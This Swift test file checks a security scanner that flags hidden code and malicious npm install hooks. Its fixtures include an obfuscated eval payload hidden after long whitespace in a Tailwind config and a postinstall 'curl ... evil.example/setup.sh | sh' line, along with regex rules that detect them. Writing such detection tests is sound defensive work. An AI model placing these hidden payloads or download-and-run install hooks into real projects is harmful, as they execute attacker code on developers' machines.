import Foundation
import Testing
@testable import BluehatCore

struct ProjectFileTests {
    static let cleanTailwind = """
        /** @type {import('tailwindcss').Config} */
        module.exports = {
          content: ["./src/**/*.{js,ts,jsx,tsx}"],
          theme: { extend: {} },
          plugins: [],
        };
        """
    static let payload = "global['_V']='8-st';global['r']=require;(function(){var _0x1a2b3c=['bWFpbg=='];eval(atob(_0x1a2b3c[0]))})();"
    static let injectedTailwind = cleanTailwind + String(repeating: " ", count: 300) + payload + "\n"

    let root = FileManager.default.temporaryDirectory.appending(path: "bluehat-project-files-\(UUID().uuidString)")
    let hiddenCode = ProjectFileTests.rule("project.hidden-code", files: ["*.config.js", "*.config.mjs"], patterns: [#"\S[ \t]{150,}\S"#])
    let installHook = ProjectFileTests.rule("project.install-download", files: ["package.json"], patterns: [#""(preinstall|install|postinstall|prepare)"\s*:\s*"[^"\n]{0,300}\b(curl|wget)\b[^"\n]{0,300}\|\s*(ba|z)?sh\b"#])

    static func rule(_ id: String, files: [String], patterns: [String]) -> Rule {
        Rule(id: id, title: id, severity: .critical, category: .backdoor, check: .projectFile, patterns: patterns, paths: nil, ports: nil, hashes: nil, setting: nil, product: nil, advisory: nil, ranges: nil, packages: nil, files: files, teams: nil, bundles: nil, minimumVersion: nil, hosts: nil, summary: nil, remedy: nil, references: nil)
    }

    func write(_ text: String, to relativePath: String) throws {
        let url = root.appending(path: relativePath)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data(text.utf8).write(to: url)
    }

    func check(_ rules: [Rule]) -> (findings: [Finding], notice: String?) {
        let projects = ProjectFolders.directories(in: [root.path], containing: NpmInventory.projectFileNames).directories
        return Scanner.projectFileFindings(rules, projects: projects)
    }

    func relative(_ findings: [Finding]) -> [String] {
        findings.map { "\($0.rule.id) \($0.detail.replacingOccurrences(of: root.path + "/", with: ""))" }
    }

    @Test(arguments: [
        ("*.config.js", "tailwind.config.js"),
        ("*.config.js", "Tailwind.Config.JS"),
        ("*.config.js", ".config.js"),
        ("next.config.*", "next.config.mjs"),
        (".eslintrc*", ".eslintrc.cjs"),
        ("*rc*.js", ".eslintrc.js"),
        ("package.json", "package.json"),
        ("*a*a", "aa"),
    ])
    func matchesFileNameGlobs(glob: String, name: String) {
        #expect(Scanner.fileName(name, matches: glob))
    }

    @Test(arguments: [
        ("*.config.js", "tailwind.config.js.bak"),
        ("*.config.js", "tailwind.config.ts"),
        ("package.json", "package.json5"),
        ("package.json", "my-package.json"),
        ("next.config.*", "next.configure.js"),
        ("*a*a", "a"),
        ("ab*ba", "aba"),
    ])
    func refusesOtherFileNames(glob: String, name: String) {
        #expect(!Scanner.fileName(name, matches: glob))
    }

    @Test func reportsTheLineOfCodeHiddenAfterLongWhitespace() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        try write("{}", to: "app/package.json")
        try write(Self.injectedTailwind, to: "app/tailwind.config.js")
        try write(Self.injectedTailwind.replacingOccurrences(of: "\n", with: "\r\n"), to: "web/tailwind.config.js")
        try write("{}", to: "web/package.json")

        let checked = check([hiddenCode])

        #expect(relative(checked.findings) == ["project.hidden-code Line 6 · app/tailwind.config.js", "project.hidden-code Line 6 · web/tailwind.config.js"])
        #expect(checked.findings.map(\.path) == [root.appending(path: "app/tailwind.config.js").path, root.appending(path: "web/tailwind.config.js").path])
        #expect(checked.findings.allSatisfy { !$0.detail.contains("eval") })
        #expect(checked.notice == nil)
    }

    @Test func cleanConfigGivesNoFinding() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        try write("{}", to: "app/package.json")
        try write(Self.cleanTailwind, to: "app/tailwind.config.js")

        #expect(check([hiddenCode]).findings.isEmpty)
    }

    @Test func reportsAnInstallScriptThatDownloadsAndRunsCodeOnly() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        try write("""
            {
              "name": "interview-task",
              "scripts": {
                "dev": "next dev",
                "postinstall": "curl -fsSL https://evil.example/setup.sh | sh"
              }
            }
            """, to: "evil/package.json")
        try write("""
            {
              "name": "shop",
              "scripts": {
                "prepare": "husky install",
                "postinstall": "prisma generate && patch-package",
                "install": "node-gyp rebuild",
                "fetch-data": "curl -fsSL https://example.com/data.json -o data.json"
              }
            }
            """, to: "shop/package.json")

        #expect(relative(check([installHook, hiddenCode]).findings) == ["project.install-download Line 5 · evil/package.json"])
    }

    @Test func ignoresFilesInDependencyGitSymlinkedAndNonNpmFolders() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        try write("{}", to: "app/package.json")
        try write(Self.injectedTailwind, to: "app/node_modules/pkg/tailwind.config.js")
        try write("{}", to: "app/node_modules/pkg/package.json")
        try write(Self.injectedTailwind, to: "app/.git/tailwind.config.js")
        try write("{}", to: "app/.git/package.json")
        try write(Self.injectedTailwind, to: "outside/tailwind.config.js")
        try write("{}", to: "outside/package.json")
        try FileManager.default.createSymbolicLink(atPath: root.appending(path: "app/linked").path, withDestinationPath: root.appending(path: "outside").path)
        try FileManager.default.createSymbolicLink(atPath: root.appending(path: "app/vite.config.js").path, withDestinationPath: root.appending(path: "outside/tailwind.config.js").path)
        try write(Self.injectedTailwind, to: "lockfile-only/tailwind.config.js")
        try write("", to: "lockfile-only/yarn.lock")
        let projects = ProjectFolders.directories(in: [root.appending(path: "app").path, root.appending(path: "lockfile-only").path], containing: NpmInventory.projectFileNames).directories

        #expect(Scanner.projectFileFindings([hiddenCode], projects: projects).findings.isEmpty)
    }

    @Test func scansTheCappedStartOfAnOversizedFileAndReportsIt() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        try write("{}", to: "app/package.json")
        let filler = String(repeating: "// padding\n", count: Scanner.maxReadBytes / 11 + 1)
        try write(Self.injectedTailwind + filler, to: "app/big.config.js")
        try write(filler + Self.injectedTailwind, to: "app/late.config.mjs")

        let checked = check([hiddenCode])

        #expect(relative(checked.findings) == ["project.hidden-code Line 6 · app/big.config.js"])
        #expect(checked.notice == "Project file check read only the first 1 MB of \(root.path)/app/big.config.js, \(root.path)/app/late.config.mjs.")
    }

    @Test func checksOnlyTheProjectsOfTheSharedWalk() throws {
        defer { try? FileManager.default.removeItem(at: root) }
        try write("{}", to: "app/package.json")
        try write(Self.injectedTailwind, to: "app/tailwind.config.js")
        var notices: [String] = []

        #expect(Scanner.findings(in: .projectFile, rules: [hiddenCode], projects: [], notices: &notices).isEmpty)
        let findings = Scanner(projectFolders: [root.path]).scan(Rulebook(schema: 1, version: 1, rules: [hiddenCode], issued: nil, expires: nil)).findings
        #expect(findings.map(\.path) == [root.appending(path: "app/tailwind.config.js").path])
    }
}
